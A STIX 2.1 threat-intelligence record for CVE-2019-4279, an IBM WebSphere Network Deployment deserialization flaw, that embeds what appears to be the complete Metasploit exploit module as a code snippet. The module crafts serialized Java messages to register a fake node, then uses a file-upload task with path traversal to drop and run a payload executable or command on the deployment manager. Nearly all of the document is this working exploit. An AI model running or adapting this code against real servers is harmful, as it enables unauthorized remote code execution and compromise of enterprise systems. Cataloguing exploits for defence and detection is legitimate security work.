{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--78334fd5-6511-42dd-b04f-a747b4ad718a",
    "created": "2024-08-14T16:56:38.40016Z",
    "modified": "2024-08-14T16:56:38.400164Z",
    "name": "IBM Websphere Application Server Network Deployment Untrusted Data Deserialization Remote Code Execution",
    "description": "( This module exploits untrusted serialized data processed by the WAS DMGR Server and Cells. NOTE: There is a required 2 minute timeout between attempts as the neighbor being added must be reset. ) 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ibm/ibm_was_dmgr_java_deserialization_rce.rb",
            "external_id": "ibm_was_dmgr_java_deserialization_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-4279"
        },
        {
            "source_name": "reference",
            "url": "https://www-01.ibm.com/support/docview.wss?uid=ibm10883628"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'IBM Websphere Application Server Network Deployment Untrusted Data Deserialization Remote Code Execution',\n      'Description' => %(\n        This module exploits untrusted serialized data processed by the WAS DMGR Server and Cells.\n        NOTE: There is a required 2 minute timeout between attempts as the neighbor being added must be reset.\n      ),\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'b0yd' # @rwincey of [Securifera](https://www.securifera.com/) / Vulnerability Discovery and MSF module author\n        ],\n      'References' =>\n        [\n          ['CVE', '2019-4279'],\n          ['URL', 'https://www-01.ibm.com/support/docview.wss?uid=ibm10883628']\n        ],\n      'Platform' => ['win'],\n      'Targets' =>\n        [\n          [\n            'Windows Binary', {\n              'Arch'     => [ARCH_X86, ARCH_X64],\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'CMD', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'win',\n              'Payload' => {'Compat' => {'RequiredCmd' => 'generic'}}\n            }\n          ]\n        ],\n      'Privileged' => true,\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2019-05-15'))\n\n    register_options(\n      [\n        Opt::RPORT(11006), # 11002,11004,11006,etc\n        OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),\n        OptRaw.new('SSLVersion', [true, 'Default Version for WASND ', 'SSLv3']),\n        OptRaw.new('SSLVerifyMode', [true, 'SSL verification method', 'CLIENT_ONCE']),\n        OptString.new('SSLCipher', [true, 'SSL Cipher string ', 'ALL'])\n      ]\n    )\n  end\n\n  def cleanup\n    disconnect\n    print_status('Disconnected from IBM Websphere DMGR.')\n    super\n  end\n\n  def exploit\n    command = nil\n\n    if target.name == 'CMD'\n      fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\") unless datastore['CMD']\n      command = datastore['CMD']\n    end\n    # Connect to IBM Websphere Application Server\n    connect\n    print_status(\"Connected to IBM WAS DMGR.\")\n\n    node_port = datastore['RPORT']\n\n    # Send packet to add neighbor\n    enc_stream = construct_tcp_node_msg(node_port)\n    send_msg(enc_stream)\n\n    sock.get_once\n    print_status('Server responded')\n\n    # Generate binary name\n    bin_name = rand_text_alpha(8)\n\n    if command\n      command = datastore['CMD']\n      payload_contents = command.to_s\n      print_status('Executing command: ' + payload_contents)\n      bin_name << \".bat\"\n    else\n      payload_contents = generate_payload_exe(code: payload.generate)\n      bin_name << \".exe\"\n    end\n\n    print_status(\"Sending payload: #{bin_name}\")\n    enc_stream = construct_bcast_task_msg(node_port, \"..\\\\..\\\\..\\\\\" + bin_name, payload_contents, bin_name)\n    send_msg(enc_stream)\n    register_file_for_cleanup(bin_name)\n  end\n\n  def send_msg(enc_stream)\n    pkt = [0x396fb74a].pack('N')\n    pkt += [enc_stream.length + 1].pack('N')\n    pkt += \"\\x00\"\n    pkt += enc_stream\n\n    # Send msg\n    sock.put(pkt)\n  end\n\n  def construct_tcp_node_msg(node_port)\n    p2p_obj = Rex::Java::Serialization::Model::NewObject.new\n    p2p_obj.class_desc = Rex::Java::Serialization::Model::ClassDesc.new\n    p2p_obj.class_desc.description = build_p2p_node_class(p2p_obj)\n\n    # Create the obj\n    object = Rex::Java::Serialization::Model::NewObject.new\n    object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new\n    object.class_desc.description = build_tcp_node_msg(object, 12, \"0.0.0.0\", node_port, p2p_obj)\n\n    # Create the stream and add the object\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::NullReference.new\n    stream.encode\n  end\n\n  def construct_bcast_task_msg(node_port, filename, byte_str, cmd)\n    # Add upload file argument\n    byte_arr = byte_str.unpack(\"C*\")\n    upfile_arg_obj = build_upfile_arg_class(filename, byte_arr, cmd)\n\n    # Create the obj\n    object = Rex::Java::Serialization::Model::NewObject.new\n    object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new\n    object.class_desc.description = build_bcast_run_task_msg(object, 41, \"0.0.0.0\", node_port, upfile_arg_obj)\n\n    # Create the stream and add the object\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object\n    stream.encode\n  end\n\n  def build_message(obj, msg_id, msg_type, orig_cell_field_type)\n    # Create the integer field and add the reference\n    id_field = Rex::Java::Serialization::Model::Field.new\n    id_field.type = 'int'\n    id_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'ID')\n\n    # Create the integer field and add the reference\n    type_field = Rex::Java::Serialization::Model::Field.new\n    type_field.type = 'int'\n    type_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'type')\n\n    # Create the object field and add the reference\n    new_field = Rex::Java::Serialization::Model::Field.new\n    new_field.type = 'object'\n    new_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'originatingCell')\n    new_field.field_type = orig_cell_field_type\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.mesh.Message')\n    msg_class_desc.serial_version = 1\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << id_field\n    msg_class_desc.fields << type_field\n    msg_class_desc.fields << new_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new\n\n    # Set the member values\n    obj.class_data << ['int', msg_id]\n    obj.class_data << ['int', msg_type]\n    obj.class_data << Rex::Java::Serialization::Model::NullReference.new\n\n    msg_class_desc\n  end\n\n  def build_bcast_flood_msg(obj, msg_type, source_ip, source_port)\n    prng = Random.new\n    msg_id = prng.rand(4294967295)\n\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 1\n\n    msg_obj = build_message(obj, msg_id, msg_type, field_ref)\n\n    # Create the integer field and add the reference\n    id_field = Rex::Java::Serialization::Model::Field.new\n    id_field.type = 'int'\n    id_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'sourceMsgID')\n\n    # Create the integer field and add the reference\n    port_field = Rex::Java::Serialization::Model::Field.new\n    port_field.type = 'int'\n    port_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'sourceUdpPort')\n\n    # Create the object field and add the reference\n    ip_arr_field = Rex::Java::Serialization::Model::Field.new\n    ip_arr_field.type = 'array'\n    ip_arr_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'sourceIP')\n    ip_arr_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, '[B')\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.mesh.BcastFloodMsg')\n    msg_class_desc.serial_version = 1\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << id_field\n    msg_class_desc.fields << port_field\n    msg_class_desc.fields << ip_arr_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = msg_obj\n\n    # Construct IP Array\n    ip_arr = source_ip.split(\".\").map(&:to_i)\n    builder = Rex::Java::Serialization::Builder.new\n    values_array = builder.new_array(\n      values_type: 'byte',\n      values: ip_arr,\n      name: '[B',\n      serial: 0x42acf317f8060854e0,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    # Set the member values\n    obj.class_data << ['int', msg_id]\n    obj.class_data << ['int', source_port]\n    obj.class_data << values_array\n\n    msg_class_desc\n  end\n\n  def build_tcp_node_msg(obj, msg_type, source_ip, source_port, p2p_obj)\n    prng = Random.new\n    msg_id = prng.rand(4294967295)\n\n    # Create the field type for the origCell\n    field_type = Rex::Java::Serialization::Model::Utf.new(nil, \"Ljava/lang/String;\")\n    msg_obj = build_message(obj, msg_id, msg_type, field_type)\n\n    # Create the port field and add the reference\n    boot_time_field = Rex::Java::Serialization::Model::Field.new\n    boot_time_field.type = 'long'\n    boot_time_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'bootTime')\n\n    # Create the port field and add the reference\n    tcp_port_field = Rex::Java::Serialization::Model::Field.new\n    tcp_port_field.type = 'int'\n    tcp_port_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'tcpPort')\n\n    # Create the port field and add the reference\n    udp_port_field = Rex::Java::Serialization::Model::Field.new\n    udp_port_field.type = 'int'\n    udp_port_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'udpPort')\n\n    # Create the object field and add the reference\n    ip_arr_field = Rex::Java::Serialization::Model::Field.new\n    ip_arr_field.type = 'array'\n    ip_arr_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'ip')\n    ip_arr_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, '[B')\n\n    # Create the task object field and add field_type\n    node_prop_field = Rex::Java::Serialization::Model::Field.new\n    node_prop_field.type = 'object'\n    node_prop_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'nodeProperty')\n    node_prop_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, \"Lcom/ibm/son/mesh/AppLevelNodeProperty;\")\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.mesh.TcpNodeMessage')\n    msg_class_desc.serial_version = 1\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << boot_time_field\n    msg_class_desc.fields << tcp_port_field\n    msg_class_desc.fields << udp_port_field\n    msg_class_desc.fields << ip_arr_field\n    msg_class_desc.fields << node_prop_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = msg_obj\n\n    # Construct IP Array\n    ip_arr = source_ip.split(\".\").map(&:to_i)\n    builder = Rex::Java::Serialization::Builder.new\n    values_array = builder.new_array(\n      values_type: 'byte',\n      values: ip_arr,\n      name: '[B',\n      serial: 0x42acf317f8060854e0,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    # Set the member values\n    obj.class_data << ['long', 0]\n    obj.class_data << ['int', source_port]\n    obj.class_data << ['int', source_port]\n    obj.class_data << values_array\n    obj.class_data << p2p_obj\n\n    msg_class_desc\n  end\n\n  def build_app_node_class(obj)\n    # Create the structured gateway field and add the reference\n    struct_bool_field = Rex::Java::Serialization::Model::Field.new\n    struct_bool_field.type = 'boolean'\n    struct_bool_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'structuredGateway')\n\n    # Create the version field and add the reference\n    version_field = Rex::Java::Serialization::Model::Field.new\n    version_field.type = 'int'\n    version_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'version')\n\n    # Create the object field and add the reference\n    bridge_field = Rex::Java::Serialization::Model::Field.new\n    bridge_field.type = 'object'\n    bridge_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'bridgedCellsList')\n    bridge_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, 'Ljava/util/List;')\n\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 4\n\n    # Create the cellname field and add the reference\n    cellname_field = Rex::Java::Serialization::Model::Field.new\n    cellname_field.type = 'object'\n    cellname_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'cellName')\n    cellname_field.field_type = field_ref\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.mesh.AppLevelNodeProperty')\n    msg_class_desc.serial_version = 1\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << struct_bool_field\n    msg_class_desc.fields << version_field\n    msg_class_desc.fields << bridge_field\n    msg_class_desc.fields << cellname_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new\n\n    # Set the member values\n    obj.class_data << ['boolean', 0]\n    obj.class_data << ['int', 0]\n    obj.class_data << Rex::Java::Serialization::Model::NullReference.new\n    obj.class_data << Rex::Java::Serialization::Model::Utf.new(nil, rand(0xffffffffffff).to_s) # Cell Name\n\n    msg_class_desc\n  end\n\n  def build_hashtable_class(obj)\n    # Create the integer field and add the reference\n    load_field = Rex::Java::Serialization::Model::Field.new\n    load_field.type = 'float'\n    load_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'loadFactor')\n\n    # Create the integer field and add the reference\n    threshold_field = Rex::Java::Serialization::Model::Field.new\n    threshold_field.type = 'int'\n    threshold_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'threshold')\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'java.util.Hashtable')\n    msg_class_desc.serial_version = 0x13BB0F25214AE4B8\n    msg_class_desc.flags = 3\n    msg_class_desc.fields = []\n    msg_class_desc.fields << load_field\n    msg_class_desc.fields << threshold_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new\n\n    obj.class_data << ['float', 0.75]\n    obj.class_data << ['int', 8]\n    obj.class_data << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x03\")\n\n    msg_class_desc\n  end\n\n  def build_properties_class\n    # Create the object\n    object = Rex::Java::Serialization::Model::NewObject.new\n    object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new\n\n    msg_obj = build_hashtable_class(object)\n\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 9\n\n    # Create the integer field and add the reference\n    defaults_field = Rex::Java::Serialization::Model::Field.new\n    defaults_field.type = 'object'\n    defaults_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'defaults')\n    defaults_field.field_type = field_ref\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'java.util.Properties')\n    msg_class_desc.serial_version = 0x3912D07A70363E98\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << defaults_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = msg_obj\n\n    # Set the member values\n    object.class_desc.description = msg_class_desc\n\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, 'memberName')\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, rand(0xffffffffffff).to_s) # Cell Name\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, 'inOdc')\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, '0')\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, 'epoch')\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, (Time.now.to_f * 1000).to_i.to_s)\n\n    object\n  end\n\n  def build_p2p_node_class(obj)\n    msg_obj = build_app_node_class(obj)\n\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 1\n\n    # Create the data field and add the reference\n    data_field = Rex::Java::Serialization::Model::Field.new\n    data_field.type = 'array'\n    data_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'data')\n    data_field.field_type = field_ref\n\n    # Create the object field and add the reference\n    prop_field = Rex::Java::Serialization::Model::Field.new\n    prop_field.type = 'object'\n    prop_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'properties')\n    prop_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, 'Ljava/util/Properties;')\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.ws.wsgroup.p2p.P2PShimNodeProperty')\n    msg_class_desc.serial_version = 2\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << data_field\n    msg_class_desc.fields << prop_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = msg_obj\n\n    # Create the byte array ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 6\n\n    # Construct IP Array\n    byte_array = Rex::Java::Serialization::Model::NewArray.new\n    byte_array.array_description = Rex::Java::Serialization::Model::ClassDesc.new\n    byte_array.array_description.description = field_ref\n    byte_array.type = \"byte\"\n    byte_array.values = []\n\n    # Set the member values\n    obj.class_data << byte_array\n\n    # Add properties\n    obj.class_data << build_properties_class\n\n    msg_class_desc\n  end\n\n  def build_upfile_arg_class(filename, bytes, cmd)\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 1\n\n    # Create the integer field and add the reference\n    filename_field = Rex::Java::Serialization::Model::Field.new\n    filename_field.type = 'object'\n    filename_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'fileName')\n    filename_field.field_type = field_ref\n\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 4\n\n    # Create the integer field and add the reference\n    filebody_field = Rex::Java::Serialization::Model::Field.new\n    filebody_field.type = 'array'\n    filebody_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'fileBody')\n    filebody_field.field_type = field_ref\n\n    # Create the field ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 1\n\n    # Create the object field and add the reference\n    post_cmd_field = Rex::Java::Serialization::Model::Field.new\n    post_cmd_field.type = 'object'\n    post_cmd_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'postProcCmd')\n    post_cmd_field.field_type = field_ref\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.plugin.UploadFileArgument')\n    msg_class_desc.serial_version = 1\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << filebody_field\n    msg_class_desc.fields << filename_field\n    msg_class_desc.fields << post_cmd_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new\n\n    # Create the byte array ref\n    field_ref = Rex::Java::Serialization::Model::Reference.new\n    field_ref.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE + 7\n\n    # Construct IP Array\n    byte_array = Rex::Java::Serialization::Model::NewArray.new\n    byte_array.array_description = Rex::Java::Serialization::Model::ClassDesc.new\n    byte_array.array_description.description = field_ref\n    byte_array.type = \"byte\"\n    byte_array.values = bytes\n\n    # Set the member values\n    object = Rex::Java::Serialization::Model::NewObject.new\n    object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new\n    object.class_desc.description = msg_class_desc\n    object.class_data << byte_array\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, filename)\n    object.class_data << Rex::Java::Serialization::Model::Utf.new(nil, cmd)\n\n    object\n  end\n\n  def build_bcast_run_task_msg(obj, msg_type, source_ip, source_port, upfile_arg_obj)\n    msg_obj = build_bcast_flood_msg(obj, msg_type, source_ip, source_port)\n\n    # Create the integer field and add the reference\n    out_int_field = Rex::Java::Serialization::Model::Field.new\n    out_int_field.type = 'int'\n    out_int_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'outputGatherInterval')\n\n    # Create the task object field and add field_type\n    task_field = Rex::Java::Serialization::Model::Field.new\n    task_field.type = 'object'\n    task_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'task')\n    task_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, \"Ljava/lang/String;\")\n\n    # Create the task object field and add field_type\n    task_arg_field = Rex::Java::Serialization::Model::Field.new\n    task_arg_field.type = 'object'\n    task_arg_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'taskArgument')\n    task_arg_field.field_type = Rex::Java::Serialization::Model::Utf.new(nil, \"Ljava/io/Serializable;\")\n\n    # Create the integer field and add the reference\n    forward_gather_field = Rex::Java::Serialization::Model::Field.new\n    forward_gather_field.type = 'int'\n    forward_gather_field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'forwardGatheredDataPipelinePeriod')\n\n    # Create the class description\n    msg_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new\n    msg_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.plugin.BcastMsgRunTask')\n    msg_class_desc.serial_version = 1\n    msg_class_desc.flags = 2\n    msg_class_desc.fields = []\n    msg_class_desc.fields << forward_gather_field\n    msg_class_desc.fields << out_int_field\n    msg_class_desc.fields << task_field\n    msg_class_desc.fields << task_arg_field\n\n    # Add annotations\n    msg_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new\n    msg_class_desc.class_annotation.contents = [Rex::Java::Serialization::Model::EndBlockData.new]\n\n    # Add superclass\n    msg_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new\n    msg_class_desc.super_class.description = msg_obj\n\n    # Set the member values\n    obj.class_data << ['int', 0]\n    obj.class_data << ['int', 1]\n    obj.class_data << Rex::Java::Serialization::Model::Utf.new(nil, 'com.ibm.son.plugin.UploadFileToAllNodes')\n    obj.class_data << upfile_arg_obj\n\n    msg_class_desc\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}